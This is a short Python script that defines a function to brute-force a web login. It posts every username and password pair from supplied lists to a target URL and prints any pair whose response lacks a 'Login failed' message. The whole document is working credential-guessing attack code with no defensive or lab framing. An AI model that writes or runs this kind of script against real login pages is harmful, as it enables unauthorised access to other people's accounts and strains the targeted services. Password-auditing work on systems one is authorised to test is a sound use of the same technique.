import requests

def brute_force_login(url, username_list, password_list):
    for username in username_list:
        for password in password_list:
            response = requests.post(url, data={'username': username, 'password': password})
            if "Login failed" not in response.text:
                print(f"[SUCCESS] Username: {username}, Password: {password}")
                return
    print("[FAILED] Brute-force attack failed.")
